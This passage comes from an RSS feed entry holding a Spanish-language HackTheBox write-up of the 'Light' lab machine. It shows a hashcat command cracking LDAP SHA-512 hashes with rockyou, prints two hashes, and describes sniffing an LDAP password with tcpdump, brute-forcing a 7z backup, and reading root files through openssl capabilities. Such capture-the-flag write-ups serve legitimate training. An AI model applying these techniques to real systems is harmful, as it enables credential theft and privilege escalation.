&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;hashcat -m &lt;span class=&#34;m&#34;&gt;1800&lt;/span&gt; -o pass.txt ldap-password.txt /usr/share/wordlist/rockyou.txt --force ldap-password.txt
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$6$3&lt;/span&gt;qx0SD9x&lt;span class=&#34;nv&#34;&gt;$Q9y1lyQaFKpxqkGqKAjLOWd33Nwdhj&lt;/span&gt;.l4MzV7vTnfkE/g/Z/7N5ZbdEQWfup2lSdASImHtQFh6zMo41ZA./44/
&lt;span class=&#34;nv&#34;&gt;$6$xJxPjT0M$1&lt;/span&gt;m8kM00CJYCAgzT4qz8TQwyGFQvk3boaymuAmMZCOfm3OA7OKunLZZlqytUp2dun509OBE2xwX/QEfjdRQzgn1
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;hr /&gt;
&lt;h1 id=&#34;http&#34;&gt;HTTP&lt;/h1&gt;
&lt;p&gt;Ya que esta maquina tiene el puerto http abierto procedemos a visitar la pagina, y nos muestra un mensaje  &lt;code&gt;This site is protected by agains bruteforging.&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/light/1.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Al visitar las paginas disponibles encontramos&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/light/2.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Al visitar la pagina de user nos muestra un mensaje &lt;code&gt;This server lets you get in with ssh. Your IP (10.10.12.63) is automatically added as userid and password within a minute of your first http page request... &lt;/code&gt;, la pagina nos genera un usuario (IP) y contraseña (IP) con los cuales podemos ingresar a la maquina por el puerto 22 de ssh.&lt;/p&gt;
&lt;hr /&gt;
&lt;h1 id=&#34;ssh&#34;&gt;SSH&lt;/h1&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/light/3.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Utilizamos las credenciales que nos proporciona la pagina y obtenemos una shell atravez de ssh con privilegios de bajo nivel.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/light/4.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Ya que no encontramos software con privilegios (SUID, GUID) que nos pueda ayudar a escalar privilegios procedemos a buscar software con ciertas &lt;a href=&#34;https://nxnjz.net/2018/08/an-interesting-privilege-escalation-vector-getcap/&#34;&gt;&lt;strong&gt;capacidades&lt;/strong&gt;&lt;/a&gt; (getcap/setcap).&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/light/5.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Encontramos tcpdump que es utilizado para analizar el trafico de una red, y tiene &lt;code&gt;CAP_NET_ADMIN&lt;/code&gt; y &lt;code&gt;CAP_NET_RAW&lt;/code&gt;, para realizar operaciones relacionadas a la red.&lt;/p&gt;
&lt;hr /&gt;
&lt;h2 id=&#34;tcpdump-&#34;&gt;TCPDUMP&lt;/h2&gt;
&lt;p&gt;Utilizamos tcpdump para ver que cosas interesantes nos podemos capturar.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/light/6.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Al realizar un analisis al archivo encontramos algo interesante, puesto que la maquina es un servidor http y ldap al mismo tiempo de alguna forma al realizar el listado de IPs baneadas el servidor hace una verificacion mediante ldap para poder actualizar dicha pagina y en los paquetes capturados encontramos al usuario ldapuser2 y su contraseña.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/light/7.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Utilizamos las credenciales encontradas y obtenemos una shell como ldapuser2 y el &lt;code&gt;user.txt&lt;/code&gt; flag.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/light/8.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;En nuestra carpeta como usuario ldapuser2 encontramos un archivo &lt;code&gt;backup.7z&lt;/code&gt; al intentar descomprimirlo nos pide una contraseña. Utilizamos fuerza bruta para poder encontrar y descomprimir el contenido del archivo, para ello &lt;a href=&#34;https://github.com/philsmd/7z2hashcat&#34;&gt;&lt;strong&gt;7z2hashcat.pl&lt;/strong&gt;&lt;/a&gt; nos fue de gran ayuda.&lt;/p&gt;
&lt;p&gt;Al descomprimir el contenido de &lt;code&gt;backup.7z&lt;/code&gt; encontramos lo siguiente.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/light/9.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Analizamos cada uno de los archivos encontramos al usuario ldapuser1 y su contraseña en &lt;code&gt;status.php&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/light/10.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Utilizamos las credenciales.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/light/11.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;hr /&gt;
&lt;h1 id=&#34;privesc---openssl-&#34;&gt;PRIVESC - OPENSSL&lt;/h1&gt;
&lt;p&gt;Al realizar una busqueda de algun software para escalar privilegios encontramos que openssl tiene las capacidades habilitadas y permitidas.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/light/12.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Utilizamos openssl para hacer bypass &lt;a href=&#34;https://gtfobins.github.io/gtfobins/openssl/&#34;&gt;&lt;strong&gt;(openssl)&lt;/strong&gt;&lt;/a&gt;, leer y escribir archivos. En este caso vamos a utilizar &lt;code&gt;openssl&lt;/code&gt; para leer el &lt;code&gt;root.txt&lt;/code&gt; flag que se encuentra en &lt;code&gt;/root/root.txt&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/light/13.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
</content:encoded>
        <dc:creator>sckull</dc:creator>
        <media:content url="https://sckull.github.io/images/posts/htb/light/cover.webp" medium="image"><media:title type="html">featured image</media:title></media:content>
        
        <media:content url="https://sckull.github.io/images/posts/htb/light/cover.webp" medium="image"><media:title type="html">meta image</media:title></media:content>
        
          
            
              <category>capabilities</category>
            
          
            
              <category>tcpdump</category>
            
          
            
              <category>openssl</category>
            
          
        
        
          
            
              <category>hackthebox</category>
            
          
            
              <category>linux</category>
            
          
        
        
      </item>
      

    
  </channel>
</rss>